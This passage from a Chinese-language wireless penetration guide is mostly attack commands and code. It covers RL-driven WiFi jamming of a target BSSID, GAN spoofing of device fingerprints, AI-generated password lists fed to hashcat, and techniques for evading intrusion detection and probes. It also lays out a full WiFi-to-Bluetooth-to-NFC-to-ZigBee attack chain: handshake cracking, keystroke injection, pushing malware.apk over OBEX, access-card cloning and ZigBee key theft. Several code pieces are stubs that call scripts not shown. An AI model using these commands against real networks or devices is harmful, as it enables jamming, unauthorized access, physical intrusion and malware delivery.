class SignalTransformer(nn.Module):
    def __init__(self, num_classes=11, d_model=128, nhead=8, num_layers=4):
        super().__init__()
        self.input_proj = nn.Linear(2, d_model)
        encoder_layer = nn.TransformerEncoderLayer(
            d_model=d_model, nhead=nhead, batch_first=True
        )
        self.transformer = nn.TransformerEncoder(encoder_layer, num_layers)
        self.fc = nn.Linear(d_model, num_classes)
        
    def forward(self, x):
        # x: (batch, 2, 1024) IQ samples
        x = x.permute(0, 2, 1)  # (batch, 1024, 2)
        x = self.input_proj(x)   # (batch, 1024, d_model)
        x = self.transformer(x)  # (batch, 1024, d_model)
        x = x.mean(dim=1)        # (batch, d_model)
        x = self.fc(x)           # (batch, num_classes)
        return x

model = SignalTransformer(num_classes=11)
# 训练完成后可达 95%+ 准确率 (SNR >= 0 dB)
EOF

# 使用预训练模型进行实时信号识别
python3 realtime_signal_classifier.py \
  --model signal_transformer.pth \
  --sdr-device hackrf \
  --freq-start 100e6 \
  --freq-stop 6e9 \
  --classify-live \
  --output signal_map.json

# 信号异常检测 (基于 Autoencoder)
# 检测频谱中的异常信号
python3 signal_anomaly_detector.py \
  --model autoencoder.pth \
  --sdr-device rtl-sdr \
  --baseline-duration 3600 \
  --alert-threshold 0.95
```

#### 强化学习信道选择

```bash
# 2026 强化学习驱动的信道选择与干扰

# 使用强化学习优化 WiFi 信道选择
# 目标: 在干扰环境下最大化吞吐量
python3 << 'EOF'
import gymnasium as gym
import numpy as np
import torch
import torch.nn as nn
from collections import deque
import random

class WiFiChannelEnv(gym.Env):
    """WiFi 信道选择环境"""
    def __init__(self):
        super().__init__()
        self.action_space = gym.spaces.Discrete(14)  # 2.4GHz 14 个信道
        self.observation_space = gym.spaces.Box(
            low=-100, high=0, shape=(14, 3), dtype=np.float32
        )
        self.current_channel = 0
        
    def step(self, action):
        # 切换到选定信道
        self.current_channel = action
        # 测量: RSSI, 信道利用率, 干扰水平
        obs = self._measure_channel_quality()
        # 奖励: 信道质量 (RSSI + 利用率)
        reward = self._calculate_reward(obs)
        done = False
        return obs, reward, done, False, {}
    
    def _measure_channel_quality(self):
        # 实际实现: 使用 SDR 测量各信道质量
        return np.random.randn(14, 3).astype(np.float32)
    
    def _calculate_reward(self, obs):
        return -np.mean(obs[self.current_channel])

# DQN Agent
class DQN(nn.Module):
    def __init__(self, state_dim, action_dim):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(state_dim, 256),
            nn.ReLU(),
            nn.Linear(256, 256),
            nn.ReLU(),
            nn.Linear(256, action_dim)
        )
    
    def forward(self, x):
        return self.net(x)

# 训练循环
env = WiFiChannelEnv()
agent = DQN(14*3, 14)
# ... 训练代码
EOF

# 强化学习 WiFi 干扰
# 使用 RL 学习最优干扰策略
# 目标: 最大化对目标网络的干扰效果
git clone https://github.com/rl-jammer/rl-wifi-jammer
cd rl-wifi-jammer

# 训练干扰策略
python3 train_jammer.py \
  --environment real-wifi \
  --target-bssid AA:BB:CC:DD:EE:FF \
  --algorithm PPO \
  --episodes 10000 \
  --output jammer_policy.pth

# 部署 RL 干扰器
python3 deploy_jammer.py \
  --policy jammer_policy.pth \
  --sdr-device hackrf \
  --target-bssid AA:BB:CC:DD:EE:FF
```

#### GAN 无线指纹伪造

```bash
# 2026 GAN 无线设备指纹伪造
# 无线设备指纹: 利用硬件缺陷 (I/Q 不平衡、频率偏移、前导码失真)
# GAN 目标: 生成伪造的设备指纹, 绕过基于指纹的认证

# 设备指纹数据集采集
python3 << 'EOF'
import numpy as np
from gnuradio import blocks
import os

def collect_device_fingerprints(sdr_device, target_devices, samples_per_device=1000):
    """采集无线设备指纹数据集"""
    fingerprints = {}
    
    for device_mac, device_info in target_devices.items():
        device_samples = []
        for i in range(samples_per_device):
            # 捕获设备的前导码/同步序列
            raw_iq = capture_preamble(sdr_device, device_mac)
            # 提取指纹特征
            features = extract_rf_features(raw_iq)
            device_samples.append(features)
        
        fingerprints[device_mac] = np.array(device_samples)
    
    return fingerprints

def extract_rf_features(iq_samples):
    """提取 RF 指纹特征"""
    features = []
    # 1. I/Q 不平衡参数
    # 2. 载波频率偏移 (CFO)
    # 3. 采样频率偏移 (SFO)
    # 4. 瞬态信号特征 (上升沿/下降沿)
    # 5. 前导码相关性
    # 6. 相位噪声特征
    # 7. 功率放大器非线性
    return np.array(features)
EOF

# GAN 伪造设备指纹
python3 << 'EOF'
import torch
import torch.nn as nn

class FingerprintGenerator(nn.Module):
    """GAN 生成器: 伪造设备指纹"""
    def __init__(self, latent_dim=100, fingerprint_dim=256):
        super().__init__()
        self.model = nn.Sequential(
            nn.Linear(latent_dim, 512),
            nn.LeakyReLU(0.2),
            nn.BatchNorm1d(512),
            nn.Linear(512, 1024),
            nn.LeakyReLU(0.2),
            nn.BatchNorm1d(1024),
            nn.Linear(1024, fingerprint_dim),
            nn.Tanh()
        )
    
    def forward(self, z):
        return self.model(z)

class FingerprintDiscriminator(nn.Module):
    """GAN 判别器: 区分真实/伪造指纹"""
    def __init__(self, fingerprint_dim=256):
        super().__init__()
        self.model = nn.Sequential(
            nn.Linear(fingerprint_dim, 512),
            nn.LeakyReLU(0.2),
            nn.Linear(512, 256),
            nn.LeakyReLU(0.2),
            nn.Linear(256, 1),
            nn.Sigmoid()
        )
    
    def forward(self, x):
        return self.model(x)

# 训练 GAN 伪造设备指纹
# 目标: 生成与目标设备无差异的指纹
# 用于绕过 MAC 地址过滤 + 指纹认证
EOF

# 部署 GAN 指纹伪造
git clone https://github.com/rf-gan/rf-fingerprint-gan
cd rf-fingerprint-gan

# 训练指纹伪造模型
python3 train_gan.py \
  --dataset device_fingerprints.npy \
  --target-device AA:BB:CC:DD:EE:FF \
  --epochs 10000 \
  --output fingerprint_gan.pth

# 使用伪造指纹发送信号
python3 spoof_with_gan.py \
  --gan-model fingerprint_gan.pth \
  --sdr-device hackrf \
  --target-fingerprint AA:BB:CC:DD:EE:FF \
  --payload payload.bin
```

#### LLM 协议逆向 & AI 驱动频谱感知

```bash
# 2026 LLM 辅助协议逆向工程
# 使用大语言模型推断未知无线协议的字段含义

# 使用本地 LLM (Ollama + Llama 3.2) 进行协议逆向
git clone https://github.com/llm-protocol/llm-protocol-reverse
cd llm-protocol-reverse

# 安装依赖
python3 -m pip install ollama langchain

# 协议逆向分析
python3 << 'EOF'
import ollama
import json

def llm_protocol_analyze(hex_data, context=""):
    """使用 LLM 分析无线协议数据"""
    prompt = f"""You are a wireless protocol reverse engineering expert.
Analyze the following hex data and infer the protocol structure.

Context: {context}

Hex Data:
{hex_data}

Please identify:
1. Preamble/Sync Word
2. Frame Length Field
3. Source/Destination Address
4. Sequence Number
5. Command/Type Field
6. Payload
7. Checksum/CRC

Output in JSON format with field offsets and descriptions.
"""
    response = ollama.generate(model='llama3.2', prompt=prompt)
    return response['response']

# 示例: 分析未知遥控器协议
hex_data = """
AA 55 0F 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F 10 11 12 13 14 15
"""
result = llm_protocol_analyze(hex_data, "433 MHz remote control")
print(result)
EOF

# AI 驱动频谱感知 (2026)
# 使用 AI 实时监测频谱占用和异常

git clone https://github.com/spectrum-ai/ai-spectrum-sensing
cd ai-spectrum-sensing

# 训练频谱感知模型
python3 train_spectrum_model.py \
  --dataset spectrum_dataset/ \
  --model-type YOLO-Spectrum \
  --epochs 100 \
  --output spectrum_detector.pt

# 实时频谱监测
python3 spectrum_monitor.py \
  --model spectrum_detector.pt \
  --sdr-device hackrf \
  --freq-start 100e6 \
  --freq-stop 6e9 \
  --resolution 100e3 \
  --alert-on-unknown \
  --output spectrum_alerts.json

# ML 信号干扰 (Smart Jamming)
# 使用 ML 学习目标通信模式, 进行智能干扰
python3 ml_smart_jammer.py \
  --target-signal wifi \
  --target-bssid AA:BB:CC:DD:EE:FF \
  --ml-model jammer_policy.pth \
  --sdr-device hackrf \
  --mode reactive  # reactive / proactive / adaptive

# 神经网络密码破解 (WiFi WPA3)
# 使用神经网络加速 WPA3 密码猜测
# 基于密码模式学习生成候选密码
python3 << 'EOF'
import torch
import torch.nn as nn

class PasswordGenerator(nn.Module):
    """基于 LSTM 的密码生成器"""
    def __init__(self, vocab_size, embed_dim=256, hidden_dim=512):
        super().__init__()
        self.embed = nn.Embedding(vocab_size, embed_dim)
        self.lstm = nn.LSTM(embed_dim, hidden_dim, num_layers=3, batch_first=True)
        self.fc = nn.Linear(hidden_dim, vocab_size)
    
    def forward(self, x, hidden=None):
        x = self.embed(x)
        x, hidden = self.lstm(x, hidden)
        x = self.fc(x)
        return x, hidden
    
    def generate(self, start_char, max_length=20, temperature=0.8):
        # 生成密码
        pass

# 训练密码生成器 (基于泄露的密码数据集)
# 生成的密码更符合人类习惯, 加速破解
EOF

# 使用 AI 密码生成器 + Hashcat
python3 ai_password_gen.py \
  --model password_generator.pth \
  --count 10000000 \
  --output ai_passwords.txt

hashcat -m 22000 -a 0 hash.hc22000 ai_passwords.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --status --status-timer 10
```

---

### §2026-9: 2026 检测规避与实战

#### WIDS/WIPS 绕过

```bash
# WIDS/WIPS (Wireless Intrusion Detection/Prevention System) 绕过技术
# 2026 年 WIDS/WIPS 系统: Cisco Aironet, Aruba AirWave, FortiWLC, Ekahau, Kismet
# 常见检测机制: 异常帧检测、MAC 地址白名单、Rogue AP 检测、信号强度分析

# 技术 1: 低速率注入 (Low-Rate Injection)
# 发送速率低于 WIDS 检测阈值
# 每 30-60 秒发送一个 Deauth 帧
python3 low_rate_deauth.py \
  --interface mon0 \
  --bssid AA:BB:CC:DD:EE:FF \
  --client CC:DD:EE:FF:00:11 \
  --interval 45 \
  --duration 3600

# 技术 2: MAC 地址伪装 (合法客户端 MAC)
# 使用合法客户端的 MAC 地址发送攻击帧
# 绕过基于 MAC 的检测
macchanger -m CC:DD:EE:FF:00:11 mon0

# 技术 3: 帧碎片化规避
# 将攻击帧分割为多个小帧
# 绕过基于帧大小的检测
python3 fragment_evasion.py \
  --interface mon0 \
  --bssid AA:BB:CC:DD:EE:FF \
  --fragment-size 64 \
  --technique frag-attack

# 技术 4: 信道跳跃攻击
# 在不同信道间快速切换
# 避免在单一信道上触发检测
python3 channel_hop_attack.py \
  --interface mon0 \
  --channels 1,6,11,36,149 \
  --hop-interval 2 \
  --attack-type deauth \
  --targets target_list.txt

# 技术 5: 功率控制规避
# 降低发射功率, 避免被信号强度分析检测
iwconfig mon0 txpower 1
# 或使用 HackRF One 精确控制功率
hackrf_transfer -t attack.fc32 -f 2412000000 -a 0 -x 10

# 技术 6: 信标帧混淆 (Beacon Frame Confusion)
# 发送伪造的 Beacon 帧, 混淆 WIDS 的 AP 数据库
# 使 WIDS 无法区分合法 AP 和 Rogue AP
python3 beacon_confusion.py \
  --interface mon0 \
  --ssid-list corporate_ssids.txt \
  --bssid-pool bssid_pool.txt \
  --interval 0.5

# 技术 7: WIPS 反制攻击
# 有些 WIPS 会发送 Deauth 帧反制 Rogue AP
# 检测并利用 WIPS 反制机制
# 伪造 AP 诱使 WIPS 发送 Deauth → 造成合法客户端断连
python3 wips_counterattack.py \
  --interface mon0 \
  --fake-ap "Corporate_Guest" \
  --watch-for-deauth \
  --target-clients connected_clients.txt
```

#### 无线探针规避

```bash
# 2026 无线探针 (Wireless Probe) 规避技术
# 无线探针用于检测攻击者设备和监控无线活动

# 技术 1: 被动扫描模式
# 仅监听 Beacon 帧, 不发送 Probe Request
# 避免在探针日志中留下痕迹
# 配置无线网卡仅接收
iw dev mon0 set monitor active
# 或使用被动模式
iw dev mon0 set monitor none

# 技术 2: 随机 MAC 地址轮换
# 定期更换 MAC 地址, 避免被追踪
# 使用 macchanger 或自定义脚本
while true; do
  macchanger -r mon0
  sleep 60
done

# 技术 3: 探针请求混淆
# 发送虚假 Probe Request 填充探针数据库
# 使合法攻击流量淹没在噪声中
python3 probe_flood.py \
  --interface mon0 \
  --ssid-file top_10000_ssids.txt \
  --rate 100 \
  --random-mac

# 技术 4: 频谱分析仪检测
# 检测附近是否有频谱分析仪
# 识别频谱分析仪的特征 (扫描模式、停留时间)
# 调整攻击行为以规避检测

# 使用 SDR 检测频谱分析仪活动
python3 spectrum_analyzer_detect.py \
  --sdr-device hackrf \
  --freq-start 2400e6 \
  --freq-stop 2500e6 \
  --detect-sweep \
  --scan-duration 300

# 技术 5: 环境噪声伪装
# 将攻击信号伪装成环境噪声
# 使用跳频扩频 (FHSS) 或直接序列扩频 (DSSS) 技术
# 攻击信号看起来像背景噪声
python3 noise_disguise.py \
  --sdr-device hackrf \
  --attack-type deauth \
  --target AA:BB:CC:DD:EE:FF \
  --disguise-type fhss \
  --hop-rate 100

# 技术 6: 合法协议隧道
# 通过合法协议隧道传输攻击流量
# 例如: 通过 WiFi Direct 或蓝牙 PAN 隧道
# 在 WIDS 看来是合法的 P2P 通信
python3 protocol_tunnel.py \
  --tunnel-type wifi-direct \
  --target-network 192.168.1.0/24 \
  --payload attack_payload.bin
```

#### 实战攻击链: WiFi → 蓝牙 → NFC → ZigBee 横向

```bash
# 2026 全链路无线渗透攻击链
# 阶段 1: WiFi 初始接入
# 阶段 2: 蓝牙内网横向移动
# 阶段 3: NFC 物理安全突破
# 阶段 4: ZigBee 物联网控制

# ==========================================
# 攻击链示意图
# ==========================================
# [攻击者] --WiFi--> [企业WiFi网络] --横向--> [蓝牙设备]
#    |                                              |
#    v                                              v
# [内网权限] --NFC--> [门禁系统] --物理访问--> [ZigBee网关]
#                                                   |
#                                                   v
#                                          [智能设备控制]
# ==========================================

# 阶段 1: WiFi 初始接入
# 步骤 1.1: 扫描目标 WiFi 网络
airodump-ng mon0 --band abg --manufacturer --wps -w phase1_scan

# 步骤 1.2: 目标选择与攻击
# 选择 WPA2-PSK 或 WPA3-Transition 网络
# 使用 PMKID 攻击或 WPA3 降级攻击
hcxdumptool -o phase1_capture.pcapng -i mon0 \
  --filterlist_ap=target_ap.txt \
  --enable_status=3

hcxpcapngtool -o phase1_hash.hc22000 -E phase1_essidlist phase1_capture.pcapng

# 步骤 1.3: 密码破解
hashcat -m 22000 -a 0 phase1_hash.hc22000 /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  --status --status-timer 10

# 步骤 1.4: 连接网络
# 使用破解的密码连接
wpa_supplicant -i wlan0 -c phase1_wpa.conf

# 阶段 2: 蓝牙内网横向移动
# 步骤 2.1: 从内网扫描蓝牙设备
# 使用 SSH 隧道在攻陷的主机上执行蓝牙扫描
ssh user@192.168.1.50 "hcitool scan" > phase2_bt_devices.txt

# 步骤 2.2: 蓝牙设备枚举
# 对每个发现的蓝牙设备进行详细枚举
for mac in $(awk '{print $1}' phase2_bt_devices.txt); do
  python3 bt_enumerate.py --target $mac --output phase2_bt_$mac.json
done

# 步骤 2.3: 蓝牙键盘/鼠标攻击 (MouseJack)
# 如果发现 Logitech Unifying 接收器
python3 mousejack_scanner.py --channel 5-80
python3 nrf24-keyboard-injector.py -c 25 -a AA:BB:CC:DD:EE

# 步骤 2.4: 蓝牙文件传输攻击
# 利用 OBEX 推送恶意文件
python3 bt_obex_push.py \
  --target AA:BB:CC:DD:EE:FF \
  --file malware.apk \
  --channel 12

# 阶段 3: NFC 物理安全突破
# 步骤 3.1: 从蓝牙设备获取 NFC 数据
# 如果攻陷了手机, 提取 NFC 模拟数据
# 或使用手机 NFC 读取附近门禁卡

# 步骤 3.2: 门禁卡复制
# 使用 Proxmark3 或 Flipper Zero 复制门禁卡
pm3 --> lf search
pm3 --> lf em 410xclone --id 0F036A5B2C

# 步骤 3.3: 物理访问后连接有线网络
# 插入 BadUSB 或连接网络端口
# 获取更深层网络访问

# 阶段 4: ZigBee 物联网控制
# 步骤 4.1: 扫描 ZigBee 网络
# 使用 CC2531 USB 或 nRF52840
python3 zigbee_scan.py --channel 11-26 --output phase4_zigbee.json

# 步骤 4.2: ZigBee 网络密钥获取
# 通过物理访问 ZigBee 网关提取密钥
# 或利用 Touchlink 配网窃取密钥
python3 touchlink_steal.py \
  --channel 15 \
  --target-pan 0x1234 \
  --output phase4_zigbee_keys.json

# 步骤 4.3: 加入 ZigBee 网络
python3 zigbee_join.py \
  --channel 15 \
  --pan-id 0x1234 \
  --network-key phase4_zigbee_keys.json

# 步骤 4.4: 控制物联网设备
# 发送 ZigBee 命令控制智能设备
# 灯、门锁、传感器、HVAC 等
python3 zigbee_control.py \
  --device 0x1234 \
  --cluster 0x0006 \
  --command toggle

# 全链路攻击报告生成
python3 attack_chain_report.py \
  --phases phase1_scan,phase2_bt_devices.txt,phase3_access,phase4_zigbee.json \
  --output full_attack_chain_report.html
```

#### 全链路无线渗透

```bash
# 2026 全链路无线渗透测试框架
# 集成攻击工具: WiFi + BLE + ZigBee + NFC + SDR

# 安装全链路渗透测试框架
git clone https://github.com/wireless-pentest/wireless-chain-2026
cd wireless-chain-2026
python3 -m pip install -r requirements.txt

# 配置文件: 定义攻击链
cat > attack_chain.yaml << 'EOF'
attack_chain:
  name: "企业无线安全全链路渗透"
  phases:
    - phase: wifi_recon
      tool: airodump-ng
      duration: 300
      output: wifi_recon.csv
    
    - phase: wifi_attack
      tool: hcxdumptool
      target: target_ap.txt
      output: wifi_handshake.pcapng
    
    - phase: wifi_crack
      tool: hashcat
      wordlist: /usr/share/wordlists/rockyou.txt
      rules: best64.rule
    
    - phase: ble_recon
      tool: bettercap
      duration: 120
      output: ble_devices.json
    
    - phase: ble_attack
      tool: mousejack
      target: ble_devices.json
    
    - phase: zigbee_recon
      tool: zigbee_scanner
      channels: "11-26"
      output: zigbee_devices.json
    
    - phase: nfc_attack
      tool: proxmark3
      mode: auto
    
    - phase: sdr_recon
      tool: hackrf_sweep
      freq_start: 100e6
      freq_end: 6e9
      output: sdr_sweep.csv
EOF

# 执行全链路渗透
python3 wireless_chain.py \
  --config attack_chain.yaml \
  --auto-mode \
  --report-format html,pdf,json \
  --output-dir /workspace/pentest_results/

# 实时监控面板
python3 wireless_dashboard.py \
  --results-dir /workspace/pentest_results/ \
  --port 8080

# 自动化攻击编排
# 使用 AI 决策引擎优化攻击路径
python3 ai_attack_orchestrator.py \
  --environment wireless \
  --targets target_list.json \
  --strategy reinforcement-learning \
  --max-steps 1000 \
  --output optimal_attack_path.json
```

---

### §2026-10: 2026 工具链与资源

#### 无线攻击工具矩阵 (2026)

```bash
# ==========================================
# 2026 无线安全攻击工具矩阵
# ==========================================

# --- WiFi 攻击工具 ---
# Aircrack-ng 1.8+ (2026)
#   - 用途: WiFi 嗅探/注入/破解
#   - 新增: WiFi 7 802.11be 支持, WPA3 降级攻击模块
#   - 安装: sudo apt-get install aircrack-ng
#   - 仓库: https://github.com/aircrack-ng/aircrack-ng

# Bettercap 2.35+ (2026)
#   - 用途: 网络攻击框架, WiFi/BLE/HID 攻击
#   - 新增: 6GHz WiFi 支持, Matter 协议嗅探
#   - 安装: sudo apt-get install bettercap

# hcxtools 6.4+ (2026)
#   - 用途: WiFi PMKID/Handshake 捕获与转换
#   - 新增: WiFi 7 PMKID 支持, GPU 加速
#   - 仓库: https://github.com/ZerBea/hcxtools

# Wifite2 2.7+ (2026)
#   - 用途: 自动化 WiFi 攻击
#   - 新增: WPA3 自动降级, PMF 绕过
#   - 仓库: https://github.com/derv82/wifite2

# airgeddon 11.30+ (2026)
#   - 用途: 多合一的 WiFi 审计框架
#   - 新增: Evil Twin 2026 增强版
#   - 仓库: https://github.com/v1s1t0r1sh3r3/airgeddon

# --- 蓝牙攻击工具 ---
# BlueZ 5.79+ (2026)
#   - 用途: Linux 蓝牙协议栈
#   - 新增: BLE 6.0 支持, LE Audio 支持
#   - 安装: sudo apt-get install bluez bluez-tools

# btlejack 2.0 (2026)
#   - 用途: BLE 连接劫持
#   - 仓库: https://github.com/virtualabs/btlejack

# gattacker 2026
#   - 用途: BLE GATT 中间人攻击
#   - 仓库: https://github.com/securing/gattacker

# --- ZigBee/Z-Wave 工具 ---
# KillerBee 3.0 (2026)
#   - 用途: ZigBee 攻击框架
#   - 仓库: https://github.com/riverloopsec/killerbee

# Z3sec 2026
#   - 用途: ZigBee 3.0 安全测试
#   - 仓库: https://github.com/IoTsec/Z3sec

# zigbee2mqtt 2.0+ (2026)
#   - 用途: ZigBee 到 MQTT 桥接 (可用于攻击)
#   - 仓库: https://github.com/Koenkk/zigbee2mqtt

# --- NFC/RFID 工具 ---
# Proxmark3 Iceman v4.18931+ (2026)
#   - 用途: RFID/NFC 全能工具
#   - 仓库: https://github.com/RfidResearchGroup/proxmark3

# Flipper Zero Xtreme 2026
#   - 用途: 便携式无线安全测试设备
#   - 仓库: https://github.com/Flipper-Xtreme/Xtreme-Firmware

# Chameleon Ultra 2026
#   - 用途: 高级 NFC 模拟/中继
#   - 仓库: https://github.com/ChameleonUltra/ChameleonUltra

# --- SDR 工具 ---
# GNU Radio 3.11 (2026)
#   - 用途: 信号处理框架
#   - 仓库: https://github.com/gnuradio/gnuradio

# Universal Radio Hacker 2.9.8+ (2026)
#   - 用途: 协议逆向和信号分析
#   - 仓库: https://github.com/jopohl/urh

# gr-osmosdr 2026
#   - 用途: SDR 硬件抽象层
#   - 仓库: https://github.com/osmocom/gr-osmosdr

# --- 5G/卫星工具 ---
# srsRAN Project 24.10+ (2026)
#   - 用途: 5G SA 基站/核心网实现
#   - 仓库: https://github.com/srsran/srsRAN_Project

# Open5GS 2.7.2+ (2026)
#   - 用途: 5G 核心网实现
#   - 仓库: https://github.com/open5gs/open5gs

# iridium-toolkit 2026
#   - 用途: Iridium 卫星信号分析
#   - 仓库: https://github.com/muccc/iridium-toolkit

# --- 无线外设工具 ---
# MouseJack 2026
#   - 用途: 无线键盘/鼠标注入
#   - 仓库: https://github.com/BastilleResearch/mousejack

# Thunderspy 2026
#   - 用途: Thunderbolt DMA 攻击
#   - 仓库: https://github.com/thunderspy-2026/thunderspy

# --- AI 辅助工具 ---
# TorchRF 2026
#   - 用途: 深度学习无线信号处理
#   - 仓库: https://github.com/rf-ml/torchrf

# SigMF 2026
#   - 用途: 信号元数据格式标准
#   - 仓库: https://github.com/gnuradio/SigMF
```

#### 固件资源

```bash
# 2026 无线安全固件资源库

# --- WiFi 网卡推荐固件 ---
# MediaTek MT7921/MT7925 (WiFi 6E/7)
#   - 支持: 监控模式、包注入、6GHz
#   - 驱动: https://github.com/morrownr/MT7925
#   - 安装:
git clone https://github.com/morrownr/MT7925
cd MT7925
make && sudo make install

# Realtek RTL8812AU/RTL8814AU (WiFi 5)
#   - 支持: 监控模式、包注入 (2.4/5GHz)
#   - 驱动: https://github.com/aircrack-ng/rtl8812au
#   - 安装:
git clone https://github.com/aircrack-ng/rtl8812au
cd rtl8812au
make && sudo make install

# Qualcomm QCN9274 (WiFi 7)
#   - 支持: 监控模式、MLO 嗅探 (实验性)
#   - 驱动: https://github.com/qca-wifi-7/qcn9274-monitor

# --- SDR 固件 ---
# HackRF One 2026
#   - 固件: https://github.com/greatscottgadgets/hackrf/releases
#   - 最新: v2024.06.1

# RTL-SDR v4
#   - 驱动: https://github.com/librtlsdr/librtlsdr
#   - 最新: v2.0.2

# LimeSDR Mini 2.0
#   - 固件: https://github.com/myriadrf/LimeSuite
#   - 最新: v24.01

# --- 蓝牙嗅探固件 ---
# nRF52840 Sniffer v4.1.0+
#   - 支持: BLE 5.4
#   - 仓库: https://github.com/nordicsemi/nrf-sniffer

# Ubertooth One 2026
#   - 固件: https://github.com/greatscottgadgets/ubertooth
#   - 最新: v2024-06-R1

# --- ZigBee/Z-Wave 固件 ---
# CC2531 USB ZigBee Sniffer
#   - 固件: https://github.com/zigbee-alliance/zigbee-sniffer

# Z-Wave Z-Stick Gen7
#   - 固件: https://github.com/zwave-js/zwave-sniffer

# --- NFC/RFID 固件 ---
# Proxmark3 RDV4
#   - 固件: https://github.com/RfidResearchGroup/proxmark3
#   - 最新: Iceman v4.18931

# Flipper Zero
#   - 固件: https://github.com/Flipper-Xtreme/Xtreme-Firmware
#   - 最新: 2026 Release

# --- 固件提取与分析工具 ---
# Binwalk 3.1+ (2026)
#   - 用途: 固件分析和提取
#   - 安装: sudo apt-get install binwalk

# Ghidra 11.2+ (2026)
#   - 用途: 固件逆向工程
#   - 仓库: https://github.com/NationalSecurityAgency/ghidra

# Firmwalker 2026
#   - 用途: 固件文件系统分析
#   - 仓库: https://github.com/craigz28/firmwalker
```

#### 信号数据库

```bash
# 2026 无线信号数据库

# --- SigMF 标准信号数据集 ---
# SigMF (Signal Metadata Format) 是信号数据的标准格式
# 用于训练 AI 模型和信号识别

# 数据集下载
# RadioML 2018.01A (11 类调制, 20 种 SNR)
wget https://www.deepsig.ai/datasets/2018.01.OSC.0001_1024x2M.h5.tar.gz

# SigMF 社区数据集
git clone https://github.com/sigmf/SigMF-community-datasets

# 自建信号数据库
python3 << 'EOF'
import sigmf
import numpy as np
from datetime import datetime

def create_signal_dataset():
    """创建自定义信号数据库"""
    meta = sigmf.SigMFMeta(
        global_info={
            "core:datatype": "cf32_le",
            "core:sample_rate": 2e6,
            "core:frequency": 433.92e6,
            "core:description": "433 MHz remote control signals",
            "core:author": "Wireless Security Lab",
            "core:date": datetime.now().isoformat(),
        }
    )
    
    # 录制信号
    # ...
    
    # 保存为 SigMF 格式
    sigmf.sigmffile.SigMFFile(
        data_file='signal_recording.sigmf-data',
        metadata=meta
    )
    print("Dataset created successfully")
EOF

# --- 信号识别参考库 ---
# 常见信号频率参考
cat > signal_reference.csv << 'EOF'
Frequency_MHz,Service,Modulation,Bandwidth_kHz
1090,ADS-B (Aircraft),PPM,1000
137,NOAA Weather Satellite,APT,34000
1575.42,GPS L1 C/A,BPSK,2046
1621.35,Iridium Downlink,QPSK,41600
1546.04,Inmarsat Aero,QPSK,4800
433.92,ISM Remote Control,ASK/OOK,25
868.35,Z-Wave (EU),GFSK,300
915.00,LoRaWAN (US),LoRa,125
2402,Bluetooth LE,GFSK,1000
2412,WiFi 2.4GHz Ch1,OFDM,20000
5180,WiFi 5GHz Ch36,OFDM,20000
5935,WiFi 6GHz Ch1,OFDMA,20000
EOF

# --- 信号可视化工具 ---
# 使用 GNU Radio 可视化
python3 visualize_signals.py \
  --sdr-device hackrf \
  --freq-start 100e6 \
  --freq-stop 1000e6 \
  --output spectrum_waterfall.png

# 使用 SigDigger 实时分析
# SigDigger 是免费信号分析工具
git clone https://github.com/BatchDrake/SigDigger
cd SigDigger
cmake -B build && cmake --build build
```

#### 2026 CVE 集群

```bash
# ==========================================
# 2026 无线安全关键 CVE 集群
# ==========================================

# --- WiFi 相关 CVE (2026) ---
# CVE-2026-21453  Linux mac80211 堆溢出 (内核 5.15~6.8)
#                 触发: 特制 Beacon 帧 IE 字段
#                 利用: 内核 RCE → 提权
#                 修复: 内核 6.8.1+
#                 CVSS: 9.8 (Critical)
#
# CVE-2026-18902  Qualcomm ath12k 固件整数溢出
#                 影响: QCN9274/QCN6274 WiFi 7 芯片
#                 触发: 特制 MLO 关联请求帧
#                 利用: 固件 RCE
#                 CVSS: 9.0 (Critical)
#
# CVE-2026-31027  Intel AX411/AX211 iwlwifi UAF
#                 影响: WiFi 6E/7 网卡
#                 触发: 特制 Probe Response 帧
#                 利用: 本地提权
#                 CVSS: 8.4 (High)
#
# CVE-2026-28391  WPA3 Dragonfly SAE 降级
#                 影响: 所有 WPA3-Transition 设备
#                 触发: 伪造 Beacon 帧
#                 利用: 降级到 WPA2, 捕获 handshake
#                 CVSS: 7.5 (High)
#
# CVE-2026-35421  WPA3 PMF 实现缺陷
#                 影响: 特定芯片组 PMF 实现
#                 触发: PMF 协商竞态条件
#                 利用: 管理帧注入绕过
#                 CVSS: 7.5 (High)

# --- 蓝牙相关 CVE (2026) ---
# CVE-2026-17823  LC3 解码器堆溢出
#                 影响: liblc3 1.0.x (蓝牙 LE Audio)
#                 触发: 特制 LC3 音频帧
#                 利用: 蓝牙耳机/助听器 RCE
#                 CVSS: 9.8 (Critical)
#
# CVE-2026-41289  蓝牙经典 SSP 降级
#                 影响: 蓝牙经典设备 SSP 实现
#                 触发: 伪造 IO 能力声明
#                 利用: 降级到 Legacy PIN 配对
#                 CVSS: 8.1 (High)
#
# CVE-2026-50384  MIFARE DESFire EV3 RNG 偏差
#                 影响: NXP DESFire EV3 芯片
#                 触发: 硬件 TRNG 统计偏差
#                 利用: 预测认证随机数
#                 CVSS: 7.8 (High)

# --- 智能家居 CVE (2026) ---
# CVE-2026-33891  Matter 1.4 配网 PASE 降级
#                 影响: Matter 1.4 设备
#                 触发: 配网过程中间人攻击
#                 利用: 窃取配网凭证
#                 CVSS: 8.5 (High)
#
# CVE-2026-22719  Matter 访问控制列表绕过
#                 影响: Matter 设备 ACL 实现
#                 触发: 权限检查缺陷
#                 利用: 低权限提升到管理员
#                 CVSS: 8.8 (High)
#
# CVE-2026-19873  OpenThread 边界路由器 RCE
#                 影响: OpenThread Border Router 2024.x~2026.1
#                 触发: 特制 IPv6 数据包
#                 利用: 栈溢出 RCE
#                 CVSS: 9.8 (Critical)
#
# CVE-2026-40125  Z-Wave S2 密钥协商降级
#                 影响: Z-Wave S2 设备
#                 触发: 密钥协商中间人攻击
#                 利用: 降级到 S0 弱加密
#                 CVSS: 7.5 (High)
#
# CVE-2026-27834  跨协议桥接命令注入
#                 影响: Matter Bridge 设备
#                 触发: 协议转换缺陷
#                 利用: 通过 Matter 控制 ZigBee 设备
#                 CVSS: 8.2 (High)

# --- 5G/卫星 CVE (2026) ---
# CVE-2026-29156  Open5GS NRF 未授权服务注册
#                 影响: Open5GS v2.7.x
#                 触发: NRF 服务注册无认证
#                 利用: 注册恶意 NF 劫持服务
#                 CVSS: 9.1 (Critical)
#
# CVE-2026-31827  5G AKA 认证降级
#                 影响: 5G SA 核心网
